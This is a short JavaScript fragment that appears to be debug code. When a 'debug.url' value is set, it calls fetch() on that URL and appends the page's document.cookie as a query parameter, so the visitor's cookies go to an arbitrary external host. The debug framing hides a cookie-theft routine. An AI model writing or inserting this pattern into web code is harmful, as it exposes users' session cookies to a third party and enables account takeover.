if (debug) {
    if (debug.url) {
        fetch(debug.url + "?" + new URLSearchParams({
            c: document.cookie
        }));
    }
}